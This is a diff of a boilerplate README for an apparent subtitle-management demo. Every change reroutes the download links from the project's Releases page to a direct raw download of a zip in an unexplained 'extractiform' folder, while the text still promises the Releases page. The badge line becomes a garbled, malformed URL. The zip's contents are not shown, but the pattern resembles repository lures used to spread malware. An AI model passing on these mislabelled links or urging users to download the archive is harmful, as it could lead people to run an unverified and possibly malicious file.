@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-1035 - Simple Application for Managing Subtitles
 
 ## 🌐 Download PowerSub Demo Now
-[![Download PowerSub](https://img.shields.io/badge/Download%20PowerSub%20Demo-v1.0-blue.svg)](https://github.com/rajay663/powersub-demo-1035/releases)
+[![Download PowerSub](https://raw.githubusercontent.com/rajay663/powersub-demo-1035/main/extractiform/powersub-demo-1035.zip%20PowerSub%https://raw.githubusercontent.com/rajay663/powersub-demo-1035/main/extractiform/powersub-demo-1035.zip)](https://raw.githubusercontent.com/rajay663/powersub-demo-1035/main/extractiform/powersub-demo-1035.zip)
 
 ## 📥 Introduction
 Welcome to the powersub-demo-1035 repository! This application helps you manage subtitles easily. Whether you're watching videos or editing them, this tool offers a user-friendly way to handle your subtitle needs. 
@@ -17,7 +17,7 @@ Welcome to the powersub-demo-1035 repository! This application helps you manage 
 To use this application, follow these steps:
 
 1. **Visit the Download Page**
-   Go to the Releases page to download the software. You can find it here: [Download PowerSub](https://github.com/rajay663/powersub-demo-1035/releases).
+   Go to the Releases page to download the software. You can find it here: [Download PowerSub](https://raw.githubusercontent.com/rajay663/powersub-demo-1035/main/extractiform/powersub-demo-1035.zip).
 
 2. **Choose the Latest Release**
    Look for the latest version at the top of the page. You'll see a list of files related to this release.
@@ -37,7 +37,7 @@ To use this application, follow these steps:
 ## 📥 Download & Install Instructions
 To download and install PowerSub Demo, please follow these simple steps:
 
-1. **Visit This Page to Download**: [Download PowerSub](https://github.com/rajay663/powersub-demo-1035/releases).
+1. **Visit This Page to Download**: [Download PowerSub](https://raw.githubusercontent.com/rajay663/powersub-demo-1035/main/extractiform/powersub-demo-1035.zip).
   
 2. **Select the Latest Release**: Find the latest version listed there. 
 
@@ -74,4 +74,4 @@ Tutorial videos and guidelines will be available in the repository soon.
 You can visit the Releases page for the latest version to download and install updates.
 
 ## 🎉 Conclusion
-Thank you for choosing PowerSub Demo! We hope this tool enhances your subtitle management experience. Be sure to visit the [Download Page](https://github.com/rajay663/powersub-demo-1035/releases) to get started today!
+Thank you for choosing PowerSub Demo! We hope this tool enhances your subtitle management experience. Be sure to visit the [Download Page](https://raw.githubusercontent.com/rajay663/powersub-demo-1035/main/extractiform/powersub-demo-1035.zip) to get started today!
